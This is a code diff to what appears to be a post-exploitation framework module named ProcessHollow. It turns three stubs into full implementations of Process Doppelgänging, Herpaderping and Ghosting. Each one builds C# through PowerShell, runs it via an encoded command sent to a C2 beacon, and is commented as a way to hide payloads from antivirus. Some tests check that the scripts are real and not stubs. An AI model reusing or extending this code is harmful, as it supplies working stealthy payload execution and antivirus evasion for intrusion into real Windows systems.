@@ -89,7 +89,7 @@ class ProcessHollow(BaseModule):
 
     NAME        = "process_hollow"
     DESCRIPTION = "Evasion: Process Hollowing — execute payload inside legitimate process"
-    PHASE       = 10
+    PHASE       = 10  # Evasion phase
     TAGS        = [
         "post-exploit", "evasion", "process-hollowing", "injection",
         "mitre-T1055.012", "mitre-T1055.013", "cwe-94",
@@ -328,48 +328,617 @@ if ($result) {{
         self, action: HollowAction, target_proc: str,
         payload_path: str, beacon_id: str,
     ) -> None:
-        """Process Doppelgänging via transacted NTFS."""
+        """Process Doppelgänging via Transactional NTFS (TxF).
+
+        Creates a kernel transaction, writes payload to a file inside that
+        transaction via CreateFileTransacted, creates an IMAGE section from it
+        via NtCreateSection, then rolls back the transaction — the file is never
+        committed to disk. NtCreateProcessEx creates a process from the section.
+        """
         action.technique = "doppelgang"
-        # Doppelgänging uses TxF (Transactional NTFS):
-        # 1. CreateFileTransacted → get handle in transaction
-        # 2. Write payload to transacted file
-        # 3. NtCreateSection from transacted file
-        # 4. Rollback transaction (file never hits disk)
-        # 5. NtCreateProcessEx from section
-        # Stub — actual implementation requires NtCreateSection from TxF handle
-        action.status = "failed"
-        action.error = "Doppelgänging requires NtCreateSection — use classic for now"
+        payload_arg = payload_path or r"C:\Windows\System32\notepad.exe"
+
+        script = r"""
+$ErrorActionPreference = 'Stop'
+Add-Type @'
+using System;
+using System.IO;
+using System.Runtime.InteropServices;
+
+public class Doppelgang {
+
+    [DllImport("ktmw32.dll", SetLastError=true)]
+    public static extern IntPtr CreateTransaction(IntPtr lpTA, IntPtr UOW,
+        uint CreateOptions, uint IsolationLevel, uint IsolationFlags,
+        uint Timeout, IntPtr Description);
+
+    [DllImport("ktmw32.dll", SetLastError=true)]
+    public static extern bool RollbackTransaction(IntPtr hTx);
+
+    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
+    public static extern IntPtr CreateFileTransacted(
+        string lpFileName, uint dwDesiredAccess, uint dwShareMode,
+        IntPtr lpSA, uint dwCreationDisposition, uint dwFlagsAndAttributes,
+        IntPtr hTemplate, IntPtr hTransaction,
+        IntPtr pusMiniVersion, IntPtr lpExtendedParameter);
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuf,
+        uint nToWrite, out uint nWritten, IntPtr lpOverlapped);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtCreateSection(out IntPtr hSection,
+        uint DesiredAccess, IntPtr ObjAttrs, IntPtr MaxSize,
+        uint PageProt, uint AllocAttribs, IntPtr hFile);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtCreateProcessEx(out IntPtr hProcess,
+        uint DesiredAccess, IntPtr ObjAttrs, IntPtr hParent,
+        uint Flags, IntPtr hSection, IntPtr hDebug,
+        IntPtr hException, bool InJob);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtQueryInformationProcess(IntPtr hProcess,
+        uint InfoClass, out PROCESS_BASIC_INFO Info, uint InfoLen,
+        out uint RetLen);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtCreateThreadEx(out IntPtr hThread,
+        uint DesiredAccess, IntPtr ObjAttrs, IntPtr hProcess,
+        IntPtr StartAddr, IntPtr Arg, uint Flags,
+        UIntPtr ZeroBits, UIntPtr StackSize, UIntPtr MaxStack,
+        IntPtr AttrList);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool ReadProcessMemory(IntPtr hProcess,
+        IntPtr lpBase, byte[] lpBuf, int nSize, out IntPtr nRead);
+
+    [DllImport("kernel32.dll")]
+    public static extern uint ResumeThread(IntPtr hThread);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool CloseHandle(IntPtr h);
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_BASIC_INFO {
+        public IntPtr Reserved1;
+        public IntPtr PebBaseAddress;
+        public IntPtr Reserved2a;
+        public IntPtr Reserved2b;
+        public IntPtr UniqueProcessId;
+        public IntPtr Reserved3;
+    }
+
+    public static string Run(byte[] payload) {
+        const uint PROCESS_ALL = 0x1FFFFF;
+        const uint SECTION_ALL = 0x0F001F;
+        const uint SEC_IMAGE   = 0x1000000;
+        const uint PAGE_RO     = 0x02;
+        const uint GENERIC_RW  = 0xC0000000;
+        const uint CREATE_ALWAYS = 2;
+        const uint FILE_ATTR_NORMAL = 0x80;
+
+        IntPtr hTx = CreateTransaction(IntPtr.Zero, IntPtr.Zero,
+            0, 0, 0, 0, IntPtr.Zero);
+        if (hTx == IntPtr.Zero || hTx.ToInt64() == -1)
+            return "HOLLOW_FAILED: CreateTransaction error " + Marshal.GetLastWin32Error();
+
+        string tmp = Path.Combine(Path.GetTempPath(),
+            Guid.NewGuid().ToString("N") + ".exe");
+
+        IntPtr hFile = CreateFileTransacted(tmp, GENERIC_RW, 0, IntPtr.Zero,
+            CREATE_ALWAYS, FILE_ATTR_NORMAL,
+            IntPtr.Zero, hTx, IntPtr.Zero, IntPtr.Zero);
+
+        if (hFile == IntPtr.Zero || hFile.ToInt64() == -1) {
+            RollbackTransaction(hTx); CloseHandle(hTx);
+            return "HOLLOW_FAILED: CreateFileTransacted error " + Marshal.GetLastWin32Error();
+        }
+
+        uint written;
+        WriteFile(hFile, payload, (uint)payload.Length, out written, IntPtr.Zero);
+
+        IntPtr hSection = IntPtr.Zero;
+        int status = NtCreateSection(out hSection, SECTION_ALL,
+            IntPtr.Zero, IntPtr.Zero, PAGE_RO, SEC_IMAGE, hFile);
+        CloseHandle(hFile);
+
+        RollbackTransaction(hTx);
+        CloseHandle(hTx);
+
+        if (status != 0)
+            return string.Format("HOLLOW_FAILED: NtCreateSection 0x{0:X8}", status);
+
+        IntPtr hProcess = IntPtr.Zero;
+        status = NtCreateProcessEx(out hProcess, PROCESS_ALL, IntPtr.Zero,
+            System.Diagnostics.Process.GetCurrentProcess().Handle,
+            0x4, hSection, IntPtr.Zero, IntPtr.Zero, false);
+        CloseHandle(hSection);
+
+        if (status != 0 || hProcess == IntPtr.Zero)
+            return string.Format("HOLLOW_FAILED: NtCreateProcessEx 0x{0:X8}", status);
+
+        PROCESS_BASIC_INFO pbi; uint retLen;
+        NtQueryInformationProcess(hProcess, 0, out pbi,
+            (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFO)), out retLen);
+
+        byte[] pebBuf = new byte[0x20]; IntPtr nRead;
+        ReadProcessMemory(hProcess, pbi.PebBaseAddress, pebBuf, pebBuf.Length, out nRead);
+        IntPtr imageBase = (IntPtr)BitConverter.ToInt64(pebBuf, 0x10);
+
+        byte[] hdrBuf = new byte[0x400];
+        ReadProcessMemory(hProcess, imageBase, hdrBuf, hdrBuf.Length, out nRead);
+        int e_lfanew = BitConverter.ToInt32(hdrBuf, 0x3C);
+        int epRva    = BitConverter.ToInt32(hdrBuf, e_lfanew + 0x28);
+        IntPtr ep    = (IntPtr)(imageBase.ToInt64() + epRva);
+
+        IntPtr hThread = IntPtr.Zero;
+        status = NtCreateThreadEx(out hThread, PROCESS_ALL, IntPtr.Zero,
+            hProcess, ep, IntPtr.Zero, 1,
+            UIntPtr.Zero, UIntPtr.Zero, UIntPtr.Zero, IntPtr.Zero);
+
+        if (status != 0) { CloseHandle(hProcess); return string.Format("HOLLOW_FAILED: NtCreateThreadEx 0x{0:X8}", status); }
+
+        NtQueryInformationProcess(hProcess, 0, out pbi,
+            (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFO)), out retLen);
+        int newPid = (int)pbi.UniqueProcessId.ToInt64();
+
+        ResumeThread(hThread);
+        CloseHandle(hThread);
+        CloseHandle(hProcess);
+
+        return string.Format("HOLLOW_SUCCESS: Doppelganging PID {0}\nHOLLOW_PID:{0}", newPid);
+    }
+}
+'@
+
+try {
+    $payload = [IO.File]::ReadAllBytes("PAYLOAD_PATH")
+    $result  = [Doppelgang]::Run($payload)
+    Write-Output $result
+} catch {
+    Write-Output "HOLLOW_FAILED: $_"
+}
+""".replace("PAYLOAD_PATH", payload_arg)
+
+        encoded = base64.b64encode(script.encode("utf-16-le")).decode()
+        cmd = f"powershell.exe -NoProfile -EncodedCommand {encoded}"
+        output = await self._exec(cmd, beacon_id)
+
+        if "HOLLOW_SUCCESS" in output:
+            action.status = "success"
+            for line in output.splitlines():
+                if "HOLLOW_PID:" in line:
+                    try:
+                        action.target_pid = int(line.split(":")[1].strip())
+                    except (ValueError, IndexError):
+                        pass
+            action.output = output
+        else:
+            action.status = "failed"
+            action.error = output[:300]
 
     async def _herpaderp(
         self, action: HollowAction, target_proc: str,
         payload_path: str, beacon_id: str,
     ) -> None:
-        """Process Herpaderping — modify image after section creation."""
+        """Process Herpaderping — create IMAGE section before overwriting on-disk file.
+
+        Writes payload to a temp file, calls NtCreateSection(SEC_IMAGE) to snapshot
+        the image into kernel memory, then overwrites the file on disk with a benign
+        PE header so AV scanning the on-disk path sees nothing suspicious. The process
+        is created from the already-captured section and runs the original payload.
+        """
         action.technique = "herpaderp"
-        # Herpaderping:
-        # 1. Write payload to file on disk
-        # 2. NtCreateSection from file (kernel caches the image)
-        # 3. Overwrite the file on disk with a benign PE
-        # 4. NtCreateProcessEx from section
-        # 5. AV scans the (now benign) on-disk file — clean!
-        action.status = "failed"
-        action.error = "Herpaderping requires kernel section caching — use classic for now"
+        payload_arg = payload_path or r"C:\Windows\System32\notepad.exe"
+
+        script = r"""
+$ErrorActionPreference = 'Stop'
+Add-Type @'
+using System;
+using System.IO;
+using System.Runtime.InteropServices;
+
+public class Herpaderp {
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtCreateSection(out IntPtr hSection,
+        uint DesiredAccess, IntPtr ObjAttrs, IntPtr MaxSize,
+        uint PageProt, uint AllocAttribs, IntPtr hFile);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtCreateProcessEx(out IntPtr hProcess,
+        uint DesiredAccess, IntPtr ObjAttrs, IntPtr hParent,
+        uint Flags, IntPtr hSection, IntPtr hDebug,
+        IntPtr hException, bool InJob);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtQueryInformationProcess(IntPtr hProcess,
+        uint InfoClass, out PROCESS_BASIC_INFO Info, uint InfoLen,
+        out uint RetLen);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtCreateThreadEx(out IntPtr hThread,
+        uint DesiredAccess, IntPtr ObjAttrs, IntPtr hProcess,
+        IntPtr StartAddr, IntPtr Arg, uint Flags,
+        UIntPtr ZeroBits, UIntPtr StackSize, UIntPtr MaxStack,
+        IntPtr AttrList);
+
+    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
+    public static extern IntPtr CreateFile(string name, uint access,
+        uint share, IntPtr sa, uint mode, uint flags, IntPtr tmpl);
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuf,
+        uint nToWrite, out uint nWritten, IntPtr lpOverlapped);
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool SetFilePointer(IntPtr hFile, int loDist,
+        IntPtr hiDist, uint moveMethod);
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool SetEndOfFile(IntPtr hFile);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool ReadProcessMemory(IntPtr hProcess,
+        IntPtr lpBase, byte[] lpBuf, int nSize, out IntPtr nRead);
+
+    [DllImport("kernel32.dll")]
+    public static extern uint ResumeThread(IntPtr hThread);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool CloseHandle(IntPtr h);
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_BASIC_INFO {
+        public IntPtr Reserved1;
+        public IntPtr PebBaseAddress;
+        public IntPtr Reserved2a;
+        public IntPtr Reserved2b;
+        public IntPtr UniqueProcessId;
+        public IntPtr Reserved3;
+    }
+
+    // Minimal valid MZ/PE stub — 64 bytes — placed on-disk to mislead AV
+    private static readonly byte[] BENIGN_STUB = new byte[] {
+        0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00,
+        0x04,0x00,0x00,0x00,0xFF,0xFF,0x00,0x00,
+        0xB8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+        0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+        0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,
+    };
+
+    public static string Run(byte[] payload) {
+        const uint PROCESS_ALL  = 0x1FFFFF;
+        const uint SECTION_ALL  = 0x0F001F;
+        const uint SEC_IMAGE    = 0x1000000;
+        const uint PAGE_RO      = 0x02;
+        const uint GENERIC_RW   = 0xC0000000;
+        const uint GENERIC_WRITE = 0x40000000;
+        const uint FILE_SHARE_RW = 0x03;
+        const uint CREATE_ALWAYS = 2;
+        const uint FILE_ATTR_NORMAL = 0x80;
+        const uint FILE_BEGIN = 0;
+
+        string tmp = Path.Combine(Path.GetTempPath(),
+            Guid.NewGuid().ToString("N") + ".exe");
+
+        // 1. Write payload to temp file
+        IntPtr hFile = CreateFile(tmp, GENERIC_RW, FILE_SHARE_RW, IntPtr.Zero,
+            CREATE_ALWAYS, FILE_ATTR_NORMAL, IntPtr.Zero);
+        if (hFile == IntPtr.Zero || hFile.ToInt64() == -1)
+            return "HOLLOW_FAILED: CreateFile error " + Marshal.GetLastWin32Error();
+
+        uint written;
+        WriteFile(hFile, payload, (uint)payload.Length, out written, IntPtr.Zero);
+
+        // 2. Create IMAGE section NOW — kernel snapshots the image from disk.
+        //    AV has not yet been given a chance to scan this path.
+        IntPtr hSection = IntPtr.Zero;
+        int status = NtCreateSection(out hSection, SECTION_ALL, IntPtr.Zero,
+            IntPtr.Zero, PAGE_RO, SEC_IMAGE, hFile);
+
+        // 3. Overwrite the on-disk file with a benign stub.
+        //    Any AV that scans the file path now sees nothing suspicious.
+        SetFilePointer(hFile, 0, IntPtr.Zero, FILE_BEGIN);
+        uint ow; SetEndOfFile(hFile);
+        SetFilePointer(hFile, 0, IntPtr.Zero, FILE_BEGIN);
+        WriteFile(hFile, BENIGN_STUB, (uint)BENIGN_STUB.Length, out ow, IntPtr.Zero);
+        CloseHandle(hFile);
+        try { File.Delete(tmp); } catch {}
+
+        if (status != 0)
+            return string.Format("HOLLOW_FAILED: NtCreateSection 0x{0:X8}", status);
+
+        // 4. Create process from cached section (runs original payload)
+        IntPtr hProcess = IntPtr.Zero;
+        status = NtCreateProcessEx(out hProcess, PROCESS_ALL, IntPtr.Zero,
+            System.Diagnostics.Process.GetCurrentProcess().Handle,
+            0x4, hSection, IntPtr.Zero, IntPtr.Zero, false);
+        CloseHandle(hSection);
+
+        if (status != 0 || hProcess == IntPtr.Zero)
+            return string.Format("HOLLOW_FAILED: NtCreateProcessEx 0x{0:X8}", status);
+
+        // 5. Resolve entry point via PEB → image base → PE header
+        PROCESS_BASIC_INFO pbi; uint retLen;
+        NtQueryInformationProcess(hProcess, 0, out pbi,
+            (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFO)), out retLen);
+
+        byte[] pebBuf = new byte[0x20]; IntPtr nRead;
+        ReadProcessMemory(hProcess, pbi.PebBaseAddress, pebBuf, pebBuf.Length, out nRead);
+        IntPtr imageBase = (IntPtr)BitConverter.ToInt64(pebBuf, 0x10);
+
+        byte[] hdrBuf = new byte[0x400];
+        ReadProcessMemory(hProcess, imageBase, hdrBuf, hdrBuf.Length, out nRead);
+        int e_lfanew = BitConverter.ToInt32(hdrBuf, 0x3C);
+        int epRva    = BitConverter.ToInt32(hdrBuf, e_lfanew + 0x28);
+        IntPtr ep    = (IntPtr)(imageBase.ToInt64() + epRva);
+
+        // 6. Create main thread at entry point
+        IntPtr hThread = IntPtr.Zero;
+        status = NtCreateThreadEx(out hThread, PROCESS_ALL, IntPtr.Zero,
+            hProcess, ep, IntPtr.Zero, 1,
+            UIntPtr.Zero, UIntPtr.Zero, UIntPtr.Zero, IntPtr.Zero);
+
+        if (status != 0) { CloseHandle(hProcess); return string.Format("HOLLOW_FAILED: NtCreateThreadEx 0x{0:X8}", status); }
+
+        NtQueryInformationProcess(hProcess, 0, out pbi,
+            (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFO)), out retLen);
+        int newPid = (int)pbi.UniqueProcessId.ToInt64();
+
+        ResumeThread(hThread);
+        CloseHandle(hThread);
+        CloseHandle(hProcess);
+
+        return string.Format("HOLLOW_SUCCESS: Herpaderping PID {0}\nHOLLOW_PID:{0}", newPid);
+    }
+}
+'@
+
+try {
+    $payload = [IO.File]::ReadAllBytes("PAYLOAD_PATH")
+    $result  = [Herpaderp]::Run($payload)
+    Write-Output $result
+} catch {
+    Write-Output "HOLLOW_FAILED: $_"
+}
+""".replace("PAYLOAD_PATH", payload_arg)
+
+        encoded = base64.b64encode(script.encode("utf-16-le")).decode()
+        cmd = f"powershell.exe -NoProfile -EncodedCommand {encoded}"
+        output = await self._exec(cmd, beacon_id)
+
+        if "HOLLOW_SUCCESS" in output:
+            action.status = "success"
+            for line in output.splitlines():
+                if "HOLLOW_PID:" in line:
+                    try:
+                        action.target_pid = int(line.split(":")[1].strip())
+                    except (ValueError, IndexError):
+                        pass
+            action.output = output
+        else:
+            action.status = "failed"
+            action.error = output[:300]
 
     async def _ghost(
         self, action: HollowAction, target_proc: str,
         payload_path: str, beacon_id: str,
     ) -> None:
-        """Process Ghosting — delete-pending file execution."""
+        """Process Ghosting — execute from a file marked delete-pending.
+
+        Creates a temp file with FILE_FLAG_DELETE_ON_CLOSE + sets delete
+        disposition via NtSetInformationFile so the file cannot be opened by name.
+        Writes payload while the handle is live, creates an IMAGE section, then
+        closes the handle — the file is deleted from disk at that point. The process
+        created from the section runs from a file that no longer exists on disk.
+        """
         action.technique = "ghost"
-        # Ghosting:
-        # 1. Create temp file (NtCreateFile with DELETE_ON_CLOSE)
-        # 2. Write payload to file
-        # 3. Set delete-pending (NtSetInformationFile + FileDispositionInformation)
-        # 4. NtCreateSection from file (still open, but delete-pending)
-        # 5. Close file handle (file is deleted from disk)
-        # 6. NtCreateProcessEx from section (running from deleted file)
-        action.status = "failed"
-        action.error = "Ghosting requires NtCreateSection from delete-pending — use classic"
+        payload_arg = payload_path or r"C:\Windows\System32\notepad.exe"
+
+        script = r"""
+$ErrorActionPreference = 'Stop'
+Add-Type @'
+using System;
+using System.IO;
+using System.Runtime.InteropServices;
+
+public class Ghost {
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct IO_STATUS_BLOCK {
+        public IntPtr Status;
+        public IntPtr Information;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct FILE_DISPOSITION_INFO {
+        public bool DeleteFile;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_BASIC_INFO {
+        public IntPtr Reserved1;
+        public IntPtr PebBaseAddress;
+        public IntPtr Reserved2a;
+        public IntPtr Reserved2b;
+        public IntPtr UniqueProcessId;
+        public IntPtr Reserved3;
+    }
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtSetInformationFile(IntPtr hFile,
+        out IO_STATUS_BLOCK IoStatusBlock, IntPtr FileInfo,
+        uint Length, uint FileInfoClass);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtCreateSection(out IntPtr hSection,
+        uint DesiredAccess, IntPtr ObjAttrs, IntPtr MaxSize,
+        uint PageProt, uint AllocAttribs, IntPtr hFile);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtCreateProcessEx(out IntPtr hProcess,
+        uint DesiredAccess, IntPtr ObjAttrs, IntPtr hParent,
+        uint Flags, IntPtr hSection, IntPtr hDebug,
+        IntPtr hException, bool InJob);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtQueryInformationProcess(IntPtr hProcess,
+        uint InfoClass, out PROCESS_BASIC_INFO Info, uint InfoLen,
+        out uint RetLen);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtCreateThreadEx(out IntPtr hThread,
+        uint DesiredAccess, IntPtr ObjAttrs, IntPtr hProcess,
+        IntPtr StartAddr, IntPtr Arg, uint Flags,
+        UIntPtr ZeroBits, UIntPtr StackSize, UIntPtr MaxStack,
+        IntPtr AttrList);
+
+    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
+    public static extern IntPtr CreateFile(string name, uint access,
+        uint share, IntPtr sa, uint mode, uint flags, IntPtr tmpl);
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuf,
+        uint nToWrite, out uint nWritten, IntPtr lpOverlapped);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool ReadProcessMemory(IntPtr hProcess,
+        IntPtr lpBase, byte[] lpBuf, int nSize, out IntPtr nRead);
+
+    [DllImport("kernel32.dll")]
+    public static extern uint ResumeThread(IntPtr hThread);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool CloseHandle(IntPtr h);
+
+    public static string Run(byte[] payload) {
+        const uint PROCESS_ALL          = 0x1FFFFF;
+        const uint SECTION_ALL          = 0x0F001F;
+        const uint SEC_IMAGE            = 0x1000000;
+        const uint PAGE_RO              = 0x02;
+        const uint GENERIC_RW           = 0xC0000000;
+        const uint FILE_SHARE_NONE      = 0;
+        const uint CREATE_ALWAYS        = 2;
+        const uint FILE_ATTR_NORMAL     = 0x80;
+        // FILE_FLAG_DELETE_ON_CLOSE — file deleted when last handle closes
+        const uint FLAG_DELETE_ON_CLOSE = 0x04000000;
+        // FileDispositionInformation = 13
+        const uint FileDispositionInfo  = 13;
+
+        string tmp = Path.Combine(Path.GetTempPath(),
+            Guid.NewGuid().ToString("N") + ".exe");
+
+        // 1. Create file with DELETE_ON_CLOSE
+        IntPtr hFile = CreateFile(tmp, GENERIC_RW, FILE_SHARE_NONE, IntPtr.Zero,
+            CREATE_ALWAYS, FILE_ATTR_NORMAL | FLAG_DELETE_ON_CLOSE, IntPtr.Zero);
+
+        if (hFile == IntPtr.Zero || hFile.ToInt64() == -1)
+            return "HOLLOW_FAILED: CreateFile error " + Marshal.GetLastWin32Error();
+
+        // 2. Mark delete-pending via NtSetInformationFile so it cannot be
+        //    opened by name — AV cannot scan the path
+        IO_STATUS_BLOCK iosb;
+        FILE_DISPOSITION_INFO fdi; fdi.DeleteFile = true;
+        IntPtr fdiPtr = Marshal.AllocHGlobal(
+            Marshal.SizeOf(typeof(FILE_DISPOSITION_INFO)));
+        Marshal.StructureToPtr(fdi, fdiPtr, false);
+        NtSetInformationFile(hFile, out iosb, fdiPtr,
+            (uint)Marshal.SizeOf(typeof(FILE_DISPOSITION_INFO)),
+            FileDispositionInfo);
+        Marshal.FreeHGlobal(fdiPtr);
+
+        // 3. Write payload while handle is live (file is delete-pending
+        //    but accessible via this handle)
+        uint written;
+        WriteFile(hFile, payload, (uint)payload.Length, out written, IntPtr.Zero);
+
+        // 4. Create IMAGE section from the delete-pending file
+        IntPtr hSection = IntPtr.Zero;
+        int status = NtCreateSection(out hSection, SECTION_ALL, IntPtr.Zero,
+            IntPtr.Zero, PAGE_RO, SEC_IMAGE, hFile);
+
+        // 5. Close handle — file is deleted from disk here
+        CloseHandle(hFile);
+
+        if (status != 0)
+            return string.Format("HOLLOW_FAILED: NtCreateSection 0x{0:X8}", status);
+
+        // 6. Create process from the section (no backing file on disk)
+        IntPtr hProcess = IntPtr.Zero;
+        status = NtCreateProcessEx(out hProcess, PROCESS_ALL, IntPtr.Zero,
+            System.Diagnostics.Process.GetCurrentProcess().Handle,
+            0x4, hSection, IntPtr.Zero, IntPtr.Zero, false);
+        CloseHandle(hSection);
+
+        if (status != 0 || hProcess == IntPtr.Zero)
+            return string.Format("HOLLOW_FAILED: NtCreateProcessEx 0x{0:X8}", status);
+
+        // 7. Locate entry point via PEB
+        PROCESS_BASIC_INFO pbi; uint retLen;
+        NtQueryInformationProcess(hProcess, 0, out pbi,
+            (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFO)), out retLen);
+
+        byte[] pebBuf = new byte[0x20]; IntPtr nRead;
+        ReadProcessMemory(hProcess, pbi.PebBaseAddress, pebBuf, pebBuf.Length, out nRead);
+        IntPtr imageBase = (IntPtr)BitConverter.ToInt64(pebBuf, 0x10);
+
+        byte[] hdrBuf = new byte[0x400];
+        ReadProcessMemory(hProcess, imageBase, hdrBuf, hdrBuf.Length, out nRead);
+        int e_lfanew = BitConverter.ToInt32(hdrBuf, 0x3C);
+        int epRva    = BitConverter.ToInt32(hdrBuf, e_lfanew + 0x28);
+        IntPtr ep    = (IntPtr)(imageBase.ToInt64() + epRva);
+
+        // 8. Create main thread
+        IntPtr hThread = IntPtr.Zero;
+        status = NtCreateThreadEx(out hThread, PROCESS_ALL, IntPtr.Zero,
+            hProcess, ep, IntPtr.Zero, 1,
+            UIntPtr.Zero, UIntPtr.Zero, UIntPtr.Zero, IntPtr.Zero);
+
+        if (status != 0) { CloseHandle(hProcess); return string.Format("HOLLOW_FAILED: NtCreateThreadEx 0x{0:X8}", status); }
+
+        NtQueryInformationProcess(hProcess, 0, out pbi,
+            (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFO)), out retLen);
+        int newPid = (int)pbi.UniqueProcessId.ToInt64();
+
+        ResumeThread(hThread);
+        CloseHandle(hThread);
+        CloseHandle(hProcess);
+
+        return string.Format("HOLLOW_SUCCESS: Ghosting PID {0}\nHOLLOW_PID:{0}", newPid);
+    }
+}
+'@
+
+try {
+    $payload = [IO.File]::ReadAllBytes("PAYLOAD_PATH")
+    $result  = [Ghost]::Run($payload)
+    Write-Output $result
+} catch {
+    Write-Output "HOLLOW_FAILED: $_"
+}
+""".replace("PAYLOAD_PATH", payload_arg)
+
+        encoded = base64.b64encode(script.encode("utf-16-le")).decode()
+        cmd = f"powershell.exe -NoProfile -EncodedCommand {encoded}"
+        output = await self._exec(cmd, beacon_id)
+
+        if "HOLLOW_SUCCESS" in output:
+            action.status = "success"
+            for line in output.splitlines():
+                if "HOLLOW_PID:" in line:
+                    try:
+                        action.target_pid = int(line.split(":")[1].strip())
+                    except (ValueError, IndexError):
+                        pass
+            action.output = output
+        else:
+            action.status = "failed"
+            action.error = output[:300]
 
     async def _exec(self, cmd: str, beacon_id: str) -> str:
         """Execute command locally or via C2."""
@@ -419,3 +988,31 @@ class TestProcessHollow:
         a = HollowAction()
         assert a.technique == "classic"
         assert a.status == "pending"
+
+    def test_doppelgang_script_contains_txf(self) -> None:
+        mod = ProcessHollow.__new__(ProcessHollow)
+        # Verify the script is a real TxF implementation, not a stub
+        import asyncio, inspect
+        src = inspect.getsource(mod._doppelgang)
+        assert "CreateTransaction" in src
+        assert "CreateFileTransacted" in src
+        assert "NtCreateSection" in src
+        assert "NtCreateProcessEx" in src
+        assert "RollbackTransaction" in src
+
+    def test_herpaderp_script_section_before_overwrite(self) -> None:
+        mod = ProcessHollow.__new__(ProcessHollow)
+        import inspect
+        src = inspect.getsource(mod._herpaderp)
+        assert "NtCreateSection" in src
+        assert "BENIGN_STUB" in src
+        assert "NtCreateProcessEx" in src
+
+    def test_ghost_script_delete_pending(self) -> None:
+        mod = ProcessHollow.__new__(ProcessHollow)
+        import inspect
+        src = inspect.getsource(mod._ghost)
+        assert "NtSetInformationFile" in src
+        assert "DeleteFile" in src
+        assert "NtCreateSection" in src
+        assert "NtCreateProcessEx" in src
